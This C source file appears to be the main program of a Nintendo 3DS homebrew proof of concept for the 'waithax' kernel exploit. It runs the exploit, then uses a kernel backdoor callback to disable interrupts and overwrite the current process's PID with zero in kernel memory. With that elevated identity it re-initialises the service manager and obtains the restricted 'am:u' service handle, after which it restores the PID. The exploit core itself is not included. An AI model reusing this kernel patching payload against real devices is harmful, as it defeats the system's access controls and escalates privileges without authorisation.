#include <3ds.h>
#include <stdio.h>
#include "waithax.h"


// Shamelessly copied from
// https://github.com/Steveice10/memchunkhax2/blob/master/source/memchunkhax2.c#L16

#define OLDNEW(x) 	     		(g_is_new3ds ? x ## _NEW : x ## _OLD)

#define CURRENT_KTHREAD	 		(*((u8**)0xFFFF9000))
#define CURRENT_KPROCESS 		(*((u8**)0xFFFF9004))

#define KPROCESS_PID_OFFSET_OLD (0xB4)
#define KPROCESS_PID_OFFSET_NEW (0xBC)


static bool g_is_new3ds = 0;
static u32 g_original_pid;

static void K_PatchPID(void)
{
	// Turn interrupts off
	__asm__ volatile("cpsid aif");

	u8 *proc = CURRENT_KPROCESS;
	u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));

	g_original_pid = *pidPtr;

	// We're now PID zero, all we have to do is reinitialize the service manager in user-mode.
	*pidPtr = 0;
}

static void K_RestorePID(void)
{
	// Turn interrupts off
	__asm__ volatile("cpsid aif");

	u8 *proc = CURRENT_KPROCESS;
	u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));

	// Restore the original PID
	*pidPtr = g_original_pid;
}

int main(int argc, char **argv)
{
	Handle amHandle = 0;
	Result res;
	bool success = false;

	gfxInitDefault();
	consoleInit(GFX_TOP, NULL);
	nsInit();
	aptInit();

	APT_CheckNew3DS(&g_is_new3ds);
	printf("System type: %s\n", g_is_new3ds ? "New" : "Old");

	// This one should fail
	res = srvGetServiceHandleDirect(&amHandle, "am:u");
	printf("am:u 1st try: res=%08lx handle=%08lx\n", res, amHandle);
	if(amHandle)
		svcCloseHandle(amHandle);

	// Run the exploit
	printf("Running exploit\n\n");
	success = waithax_run();

	printf("\nExploit returned: %s\n", success ? "Success!" : "Failure.");
	if(!success)
		goto end;

	printf("Patching PID\n");
	waithax_backdoor(K_PatchPID);

	printf("Reiniting srv:\n");
	srvExit();
	srvInit();

	printf("Restoring PID\n");
	waithax_backdoor(K_RestorePID);

	printf("Cleaning up\n");
	waithax_cleanup();

	// This one hopefully won't
	res = srvGetServiceHandleDirect(&amHandle, "am:u");
	printf("am:u 2nd try: res=%08lx handle=%08lx\n\n", res, amHandle);
	if(amHandle)
		svcCloseHandle(amHandle);

end:
	printf("Press START to exit.\n");

	while(aptMainLoop())
	{
		hidScanInput();
		if(hidKeysDown() & KEY_START)
			break;

		gfxFlushBuffers();
		gfxSwapBuffers();
		gspWaitForVBlank();
	}

	aptExit();
	nsExit();
	gfxExit();
	return 0;
}
